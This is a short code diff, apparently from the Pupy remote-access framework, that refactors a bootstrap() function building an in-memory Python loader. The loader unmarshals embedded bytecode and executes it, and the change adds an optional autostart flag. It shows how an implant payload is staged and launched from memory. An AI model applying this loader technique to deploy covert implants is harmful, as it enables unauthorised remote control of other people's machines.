@@ -180,8 +180,8 @@ def safe_file_exists(f):
     return os.path.basename(f) in os.listdir(os.path.dirname(f))
 
 
-def bootstrap(stdlib, config):
-    loader = '\n'.join([
+def bootstrap(stdlib, config, autostart=True):
+    actions = [
         'import imp, sys, marshal',
         'stdlib = marshal.loads({stdlib})',
         'config = marshal.loads({config})',
@@ -191,8 +191,15 @@ def bootstrap(stdlib, config):
         'pupy.__path__ = ["pupy://pupy/"]',
         'sys.modules["pupy"] = pupy',
         'exec marshal.loads(stdlib["pupy/__init__.pyo"][8:]) in pupy.__dict__',
-        'pupy.main(stdlib=stdlib, config=config)'
-    ])
+    ]
+
+    if autostart:
+        actions.append('pupy.main(stdlib=stdlib, config=config)')
+    else:
+        actions.append('def main():')
+        actions.append('    pupy.main(stdlib=stdlib, config=config)')
+
+    loader = '\n'.join(actions)
 
     return loader.format(
         stdlib=repr(marshal.dumps(stdlib)),
